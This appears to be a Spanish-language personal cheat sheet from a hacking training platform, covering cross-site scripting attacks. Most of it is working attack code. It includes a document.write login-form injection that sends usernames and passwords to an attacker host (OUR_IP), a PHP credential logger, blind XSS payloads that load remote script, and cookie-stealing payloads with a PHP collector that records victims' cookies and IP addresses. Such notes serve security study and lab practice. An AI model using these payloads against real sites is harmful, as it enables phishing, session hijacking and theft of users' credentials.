## Poc
```html
<script>alert(window.origin)</script>
```

```html
<script>alert(document.cookie)</script>
```

Ez y no usar alert():

```
<script>print()</script>
```
cuando es DOM-based :
```html
<img src="" onerror=alert(window.origin)>
```


## login form injection
todo esto metido en la funcion document.write()
```html
<h3>Please login to continue</h3>
<form action=http://OUR_IP>
    <input type="username" name="username" placeholder="Username">
    <input type="password" name="password" placeholder="Password">
    <input type="submit" name="submit" value="Login">
</form>
```

ANTES:
<img width="1067" height="406" alt="image" src="https://github.com/user-attachments/assets/ba8e2d8e-a17f-4d20-bba9-f7b8258ceec5" />


DESPUES:
<img width="1052" height="253" alt="image" src="https://github.com/user-attachments/assets/c19487d1-ee32-4555-94dc-afa0648d9f7f" />


 vemos que tenemos el formulario pero todavía está el formulario antiguo, por ende tenemos que borrar el antiguo formulario,para ello utilizaremos la función `document.getElementById().remove()` y para ver el ID lo veremos en el código html : 
 ```html
<form role="form" action="index.php" method="GET" id='urlform'>
    <input type="text" placeholder="Image URL" name="url">
</form>
```

PAYLOAD FINAL:

```javascript
document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();
```

Y para recibir las credenciales : 
```shell-session
bonack@htb[/htb]$ sudo nc -lvnp 80
```
alo usar netcat el us soluario que ponga las credenciales le saltará un error , si queremos algo mas realista insertaremos un codigo php que haga que le redirija a la página original de nuevo, el archivo sera `index.php` guardado en ``/tmp/tmpserver/`` . CODIGO:

```php
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://SERVER_IP/phishing/index.php");
    fclose($file);
    exit();
}
?>
```

y luego : 

```shell-session
bonack@htb[/htb]$ mkdir /tmp/tmpserver
bonack@htb[/htb]$ cd /tmp/tmpserver
bonack@htb[/htb]$ vi index.php #at this step we wrote our index.php file
bonack@htb[/htb]$ sudo php -S 0.0.0.0:80
PHP 7.4.15 Development Server (http://0.0.0.0:80) started
```
 luego las credenciales se guardarán en un archivo `creds.txt`


## Blind XSS

XSS a una pagina a la que no tenemos acceso

payloads:

```html
<script src=http://OUR_IP></script>

'><script src=http://OUR_IP></script>

"><script src=http://OUR_IP></script>

javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')

<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>

<script>$.getScript("http://OUR_IP")</script>
```
 y hacer : 
```
 mkdir /tmp/tmpserver
 cd /tmp/tmpserver
 sudo php -S 0.0.0.0:80
```



###  Session Hijacking

solo si las cookies NO son HTTP only

payloads:

`
```javascript
<script>document.location='http://OUR_IP/index.php?c='+document.cookie</script>
<script>new Image().src='http://OUR_IP/index.php?c='+document.cookie</script> 
```


codigo para ordenar las cookies que encontremos(index.php) : 

```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```
